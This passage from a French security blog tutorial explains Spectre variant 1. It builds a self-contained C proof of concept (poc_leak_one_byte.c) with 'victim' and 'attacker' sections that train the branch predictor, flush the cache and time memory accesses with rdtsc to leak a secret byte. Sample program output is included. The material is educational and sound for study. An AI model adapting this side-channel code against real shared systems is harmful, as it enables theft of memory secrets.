        <span class="n">before</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge actuel</span>
        <span class="n">access_value</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">[</span><span class="n">value</span><span class="p">]);</span> <span class="c1">// Accès à la page</span>
        <span class="n">_mm_lfence</span><span class="p">();</span> <span class="c1">// Permet d'éviter que 'after' soit récupéré avant que 'access_value' ne termine</span>
        <span class="n">after</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge actuel</span>

        <span class="kt">uint32_t</span> <span class="n">diff</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">after</span><span class="o">-</span><span class="n">before</span><span class="p">);</span> <span class="c1">// Nombre de cycles pour l'accès à la zone mémoire</span>

        <span class="n">access_time</span> <span class="o">+=</span> <span class="n">diff</span><span class="p">;</span>
        
        <span class="cm">/*
         * Si le temps d'accès était supérieur à 80 cycles, alors on considère que la plage mémoire
         * étant dans la RAM
         * Sinon, elle était probablement dans le cache
         */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">diff</span> <span class="o">&gt;</span> <span class="mi">80</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">in_ram</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">in_cache</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="n">in_cache</span> <span class="o">&gt;</span> <span class="n">in_ram</span><span class="p">)</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"["</span> <span class="n">GREEN</span> <span class="s">"*"</span> <span class="n">RESET</span> <span class="s">"] "</span><span class="p">);</span>
    <span class="k">else</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[ ] "</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"% 4i % 4i % 5i - "</span><span class="p">,</span> <span class="n">in_cache</span><span class="p">,</span> <span class="n">in_ram</span><span class="p">,</span> <span class="n">access_time</span> <span class="o">/</span> <span class="n">COUNT</span> <span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">in_cache</span> <span class="o">&gt;</span> <span class="n">in_ram</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">get_all_access_time</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/*
     * Pour toutes les pages du buffer, on calcule le temps d'accès
     * CACHE : Nombre de fois où le nombre de cycle d'horloge était &lt; à 80
     * MEM : Nombre de fois où le nombre de cycle d'horloge était &gt; à 80
     * CYCLES : Moyenne du nombre de cycle d'horloge pour l'accès
     * HIT : Indique si, en moyenne, on a trouvé que la variable était en cache
     */</span>
    <span class="n">printf</span><span class="p">(</span>
        <span class="s">"    CACHE MEM CYCLES    HIT</span><span class="se">\n</span><span class="s">"</span>
        <span class="s">"---------------------------</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="cm">/* On réduit la plage pour l'exemple, car seule 'H' nous intéresse */</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="sc">'A'</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="sc">'Z'</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%c: %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">i</span><span class="p">,</span> <span class="n">get_index_access_time</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">i</span><span class="p">));</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">paged_buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="cm">/* Permet d'éviter une optimisation appelée lazy allocation */</span>
    <span class="p">}</span> 

    <span class="n">get_all_access_time</span><span class="p">(</span><span class="sc">'H'</span><span class="p">);</span> <span class="c1">// 'H' est un char qui correspond à 72 en ASCII</span>
    
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Voici donc un programme fonctionnel qui met en cache une page à l’index 72 (représenté par ‘H’ en ASCII). Nous avons réduit la boucle qui parcourt le tableau de pages car nous ne nous intéressons qu’à la mise en cache de l’index 72. La sortie du programme est la suivante :</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pixis@hackndo:~/spectre$ gcc -O0 poc_cache.c -o poc_cache &amp;&amp; ./poc_cache
    CACHE MEM CYCLES    HIT
---------------------------
[ ]    0  100   265 - A: 0
[ ]    0  100   262 - B: 0
[ ]    0  100   279 - C: 0
[ ]    0  100   281 - D: 0
[ ]    0  100   271 - E: 0
[ ]    0  100   277 - F: 0
[ ]    0  100   272 - G: 0
[*]  100    0    38 - H: 1
[ ]    0  100   262 - I: 0
[ ]    0  100   286 - J: 0
[ ]    0  100   278 - K: 0
[ ]    0  100   262 - L: 0
[ ]    0  100   270 - M: 0
[ ]    0  100   292 - N: 0
[ ]    0  100   280 - O: 0
[ ]    0  100   272 - P: 0
[ ]    0  100   329 - Q: 0
[ ]    0  100   702 - R: 0
[ ]    0  100   279 - S: 0
[ ]    0  100   256 - T: 0
[ ]    0  100   285 - U: 0
[ ]    0  100   268 - V: 0
[ ]    0  100   290 - W: 0
[ ]    0  100   277 - X: 0
[ ]    1   99   262 - Y: 0
[ ]    0  100   262 - Z: 0
</code></pre></div></div>

<p>L’index 72 (ou ‘H’) a bien été mis en cache. On le voit car la moyenne sur 100 accès est de 38 cycles d’horloge, et les 100 accès se sont faits en moins de 80 cycles, comme en témoigne la colonne ‘CACHE’.</p>

<p>Maintenant que nous arrivons à connaître l’index de la page du tableau qui a été mise en cache, il est temps de voir que la prédiction va faire le même résultat, même si nous n’exécutons normalement pas le code car la branche ne devrait pas être prise.</p>

<h2 id="poc-de-mise-en-cache-par-prédiction">PoC de mise en cache par prédiction</h2>

<p>Pour pouvoir mettre en pratique cet exemple, nous allons imaginer un cas (un peu) réel. Notre programme va être divisé en deux parties.</p>

<p>La première partie représentera un programme cible, victime, qui ne propose à ses utilisateurs qu’une seule fonction. Cette fonction permet d’accéder aux pages d’un buffer en utilisant les variables d’un autre buffer. La fonction mise à disposition est la suivante :</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Buffer maitrisé, des valeurs étant entre 0 et 255 */</span>
<span class="kt">int</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">15</span><span class="p">};</span>

<span class="cm">/* Une valeur absolument inaccessible avec la seule fonction ci-dessous */</span>
<span class="kt">char</span> <span class="o">*</span> <span class="n">secret</span> <span class="o">=</span> <span class="s">"SECRET"</span><span class="p">;</span>

<span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">my_protected_function</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/*
     * La fonction vérifie que l'index fourni en paramètre est bien dans les limites du tableau
     * de ce programme. Le tableau "buffer" est initialisé/contrôlé par ce programme, donc
     * les valeurs sont maitrisées de telle sorte à ce que 0 &lt;= buffer[idx] &lt;= 255
     */</span>
    <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="n">buffer_size</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">x</span> <span class="o">^</span> <span class="n">paged_buffer</span><span class="p">[</span><span class="n">buffer</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Un attaquant n’ayant accès qu’à cette fonction ne pourra à priori pas faire de buffer overflow pour essayer de sortir des informations qui ne sont pas dans le tableau <code class="highlighter-rouge">buffer</code>. En particulier, le contenu de la variable <code class="highlighter-rouge">secret</code> semble inatteignable.</p>

<p>L’attaquant va utiliser la vulnérabilité présentée dans l’article sur <a href="/meltdown-spectre">Meltdown et Spectre</a> qui explique en deux mots qu’il peut entraîner le processeur à suivre une branche lors d’une condition, puis, dans une optique d’optimisation, ce processeur exécutera le contenu de la branche en question la prochaine fois qu’il trouvera la condition, avant même d’avoir vérifié la validité de la condition. Bien entendu, si la condition s’avère fausse, le processeur annulera ses actions, sans pour autant effacer les mises en cache.</p>

<p>L’attaquant va donc entraîner le processeur à rentrer dans la condition de la fonction de la victime, donc l’habituer au fait que <code class="highlighter-rouge">0 &lt;= idx &lt; buffer_size</code>, puis une fois que le processeur est bien entraîné, l’attaquant va lui fournir une valeur qui n’est pas du tout dans cet intervalle.</p>

<p>Voilà le code simplifié complété pour réaliser cette opération :</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Initialisation du buffer de 256 pages */</span>
<span class="kt">char</span> <span class="n">paged_buffer</span><span class="p">[</span><span class="mi">256</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">];</span>

<span class="cm">/* Le programme va entraîner 10 fois le processeur à prendre la branche puis changera d'index */</span>
<span class="cp">#define TRAIN 10
</span><span class="kt">uint32_t</span> <span class="nf">get_index_access_time</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">int</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">flush</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">[</span><span class="n">value</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">]);</span> <span class="c1">// On supprime la page de tous les niveaux de cache</span>

    <span class="cm">/* Un index valide est utilisé pour l'entraînement */</span>
    <span class="kt">int</span> <span class="n">valid_idx</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">TRAIN</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">my_protected_function</span><span class="p">(</span><span class="n">valid_idx</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/*
     * On accède ensuite à une zone mémoire qui n'est plus autorisée normalement
     * On va utiliser un index soigneusement choisi pour que la zone mémoire qui sera
     * accédée soit le premier octet du secret
     */</span>
    <span class="n">my_protected_function</span><span class="p">(</span><span class="n">evil_idx</span><span class="p">);</span>

    <span class="cm">/*
     * La prédiction de branche devrait avoir lu la valeur du premier octet du secret 'S' ou 83 en décimal,
     * puis a dû accéder à l'index du tableau de page, mettant en cache la page à l'index 83.
     * Comme le processeur se rend compte de son erreur, les changements sont annulés, mais la mise
     * en cache existe encore. On va donc pouvoir mesurer les temps d'accès pour trouver cette fameuse
     * valeur.
     * Il faut faire cet entraînement pour chaque octet testé dans la boucle de la fonction main
     * Au moment où la boucle sera à 83 ou 'S' les instructions suivantes montreront que la valeur est en cache
     * On saura alors que le premier octet du secret est un 'S'
     */</span>

    <span class="kt">int</span> <span class="n">before</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge actuel</span>
    <span class="n">access</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">[</span><span class="n">value</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">]);</span> <span class="c1">// Accès à la zone mémoire</span>
    <span class="kt">int</span> <span class="n">after</span>  <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge suite à l'accès mémoire</span>
    <span class="k">return</span> <span class="n">after</span> <span class="o">-</span> <span class="n">before</span><span class="p">;</span> <span class="c1">// On retourne la différence pour avoir le temps d'accès</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* Pour toutes les pages du buffer, on calcule le temps d'accès */</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="sc">'A'</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="sc">'Z'</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* Le premier argument, c'est l'index permettant d'atteindre le premier octet du secret */</span>
        <span class="kt">int</span> <span class="n">evil_idx</span> <span class="o">=</span> <span class="mh">0x12bb36f1</span><span class="p">;</span> <span class="c1">// Exemple au hasard, c'est pour simplifier le code</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%c: %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">i</span><span class="p">,</span> <span class="n">get_index_access_time</span><span class="p">(</span><span class="n">evil_idx</span><span class="p">,</span> <span class="n">i</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>

<p>J’ai ajouté beaucoup de commentaires pour comprendre le fonctionnement de l’attaque dans ce programme. Normalement, ces commentaires suffisent à comprendre le programme. En les reportant dans un code fonctionnel, et en précisant des détails, voici le programme complet :</p>

<p><strong>poc_leak_one_byte.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;x86intrin.h&gt;
</span>
<span class="cp">#define GREEN   "\x1b[32m"
#define RESET   "\x1b[0m"
</span>
<span class="cp">#define PAGE_SIZE 512
#define COUNT 100
#define BUFFER_SIZE 16
</span>


<span class="cm">/**
 ** CODE DE LA VICTIME
 **/</span>

<span class="k">volatile</span> <span class="kt">uint32_t</span> <span class="n">buffer_size</span> <span class="o">=</span> <span class="n">BUFFER_SIZE</span><span class="p">;</span>

<span class="cm">/* Buffer maitrisé, des valeurs étant entre 0 et 255 */</span>
<span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">15</span><span class="p">};</span>

<span class="cm">/* Une valeur absolument inaccessible avec la seule fonction ci-dessous */</span>
<span class="kt">char</span> <span class="o">*</span> <span class="n">secret</span> <span class="o">=</span> <span class="s">"SECRET"</span><span class="p">;</span>

<span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="n">paged_buffer</span><span class="p">[</span><span class="mi">256</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">];</span>
<span class="k">volatile</span> <span class="kt">uint32_t</span> <span class="n">paged_buffer_sz</span> <span class="o">=</span> <span class="mi">256</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>

<span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">my_protected_function</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/*
     * La fonction vérifie que l'index fourni en paramètre est bien dans les limites du tableau
     * de ce programme. Le tableau "buffer" est initialisé/contrôlé par ce programme, donc
     * les valeurs sont maitrisées de telle sorte à ce que 0 &lt;= buffer[idx] &lt;= 255
     */</span>
    <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="n">buffer_size</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">x</span> <span class="o">^</span> <span class="n">paged_buffer</span><span class="p">[</span><span class="n">buffer</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cm">/**
 ** CODE DE L'ATTAQUANT
 **/</span>

<span class="kt">void</span> <span class="nf">access_value</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* Wrapper pour éviter les optimisations */</span>
    <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">x</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">delay</span><span class="p">()</span> <span class="p">{</span>
    <span class="cm">/* Ne fait rien à part faire passer le temps */</span>
    <span class="kt">uint32_t</span> <span class="n">x</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="k">volatile</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">x</span> <span class="o">*=</span> <span class="n">i</span><span class="p">;</span>
        <span class="n">x</span> <span class="o">^=</span> <span class="mi">444</span><span class="p">;</span>
        <span class="n">x</span> <span class="o">*=</span> <span class="mi">555</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cp">#define TRAIN 30
#define FREQ 5
</span><span class="kt">uint32_t</span> <span class="nf">get_index_access_time</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">int</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">cycle_difference</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">access_time</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">in_ram</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">in_cache</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">diff</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="cm">/* Récupère l'index de la page à laquelle on accède */</span>
    <span class="n">value</span> <span class="o">*=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>

    <span class="cm">/* Boucle pour faire une moyenne sur COUNT accès */</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">COUNT</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

        <span class="cm">/* Vidage du cache */</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">_mm_clflush</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">paged_buffer</span> <span class="o">+</span> <span class="n">j</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">));</span>
        <span class="p">}</span>
        
        <span class="cm">/* Index trx qui est dans les limites du tableau */</span>
        <span class="kt">uint32_t</span> <span class="n">trx</span> <span class="o">=</span> <span class="n">idx</span> <span class="o">%</span> <span class="n">buffer_size</span><span class="p">;</span>

        <span class="cm">/* Entrainement de la branche */</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">TRAIN</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* On enlève la variable de taille du tableau du cache pour que la comparaison soit lente */</span>
            <span class="n">_mm_clflush</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buffer_size</span><span class="p">);</span>
            <span class="n">delay</span><span class="p">();</span>

            <span class="cm">/*
             * Trick emprunté de plusieurs PoC en ligne.
             * Il permet de faire une condition, sans pour autant ajouter des branches
             * L'ajout de branche risque d'annuler l'optimisation du processeur qui verrait
             * plusieurs chemin, donc n'entraînerait pas correctement son choix de branche.
             *
             * Le pseudo-code équivalent est le suivant
             *
             * if (i % FREQ == 0) {
             *     addr = idx; // Index d'attaque
             * } else {
             *     addr = trx; // Index dans le tableau
             * }
             * 
             * En faisant ceci, encore dans une optique de moyenne, toutes les FREQ itération
             * on va essayer de jouer sur la prédiction avec l'index du secret en paramètre
             * En faisant cela plusieurs fois, il devrait y avoir au moins une mise en cache
             */</span>

            <span class="kt">int</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">((</span><span class="n">i</span> <span class="o">%</span> <span class="n">FREQ</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xffff</span><span class="p">;</span> <span class="c1">// addr = 0xffff0000 si i % FREQ == 0</span>
            <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr</span> <span class="o">|</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">));</span> <span class="c1">// addr = FFFF si i % FREQ == 0</span>
            <span class="n">addr</span> <span class="o">=</span> <span class="n">trx</span> <span class="o">^</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">trx</span> <span class="o">^</span> <span class="n">idx</span><span class="p">));</span> <span class="c1">// addr = idx si i % FREQ == 0; sinon trx</span>

            <span class="n">my_protected_function</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">delay</span><span class="p">();</span>

        <span class="kt">int</span> <span class="n">before</span><span class="p">,</span> <span class="n">after</span><span class="p">;</span>

        <span class="n">before</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge actuel</span>
        <span class="n">access_value</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">[</span><span class="n">value</span><span class="p">]);</span> <span class="c1">// Accès à la page</span>
        <span class="n">_mm_lfence</span><span class="p">();</span> <span class="c1">// Permet d'éviter que 'after' soit récupéré avant que 'access_value' ne termine</span>
        <span class="n">after</span> <span class="o">=</span> <span class="n">__rdtsc</span><span class="p">();</span> <span class="c1">// Donne le nombre de cycle d'horloge actuel</span>

        <span class="kt">uint32_t</span> <span class="n">diff</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">after</span><span class="o">-</span><span class="n">before</span><span class="p">);</span> <span class="c1">// Nombre de cycles pour l'accès à la zone mémoire</span>

        <span class="n">access_time</span> <span class="o">+=</span> <span class="n">diff</span><span class="p">;</span>
        
        <span class="cm">/*
         * Si le temps d'accès était supérieur à 80 cycles, alors on considère que la plage mémoire
         * étant dans la RAM
         * Sinon, elle était probablement dans le cache
         */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">diff</span> <span class="o">&gt;</span> <span class="mi">80</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">in_ram</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">in_cache</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    
    <span class="k">if</span><span class="p">(</span><span class="n">in_cache</span> <span class="o">&gt;</span> <span class="n">in_ram</span><span class="p">)</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"["</span> <span class="n">GREEN</span> <span class="s">"*"</span> <span class="n">RESET</span> <span class="s">"] "</span><span class="p">);</span>
    <span class="k">else</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[ ] "</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"% 4i % 4i % 5i - "</span><span class="p">,</span> <span class="n">in_cache</span><span class="p">,</span> <span class="n">in_ram</span><span class="p">,</span> <span class="n">access_time</span> <span class="o">/</span> <span class="n">COUNT</span> <span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">in_cache</span> <span class="o">&gt;</span> <span class="n">in_ram</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">get_all_access_time</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/*
     * Pour toutes les pages du buffer, on calcule le temps d'accès
     * CACHE : Nombre de fois où le nombre de cycle d'horloge était &lt; à 80
     * MEM : Nombre de fois où le nombre de cycle d'horloge était &gt; à 80
     * CYCLES : Moyenne du nombre de cycle d'horloge pour l'accès
     * HIT : Indique si, en moyenne, on a trouvé que la variable était en cache
     */</span>
    <span class="n">printf</span><span class="p">(</span>
        <span class="s">"    CACHE MEM CYCLES    HIT</span><span class="se">\n</span><span class="s">"</span>
        <span class="s">"---------------------------</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="cm">/* On réduit la plage pour l'exemple, car seule 'H' nous intéresse */</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="sc">'A'</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="sc">'Z'</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%c: %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">i</span><span class="p">,</span> <span class="n">get_index_access_time</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">i</span><span class="p">));</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">paged_buffer</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">paged_buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="cm">/* Permet d'éviter une optimisation appelée lazy allocation */</span>
    <span class="p">}</span>

    <span class="cm">/*
     * L'index qu'on passe en argument sera utilisé de la manière suivante :
     * paged_buffer[buffer[idx] * PAGE_SIZE];
     * J'ai rappelé dans l'article sur meltdown et spectre que
     * buffer[idx]
     * était équivalent à
     * *(buffer + idx)
     * Donc pour accéder à l'adresse du premier octet de secret, on cherche
     * secret = buffer + idx
     * donc idx = secret - buffer
     * D'où le choix de l'argument dans l'instruction suivante.
     */</span>
    <span class="n">get_all_access_time</span><span class="p">(</span><span class="n">secret</span> <span class="o">-</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="p">)</span> <span class="n">buffer</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

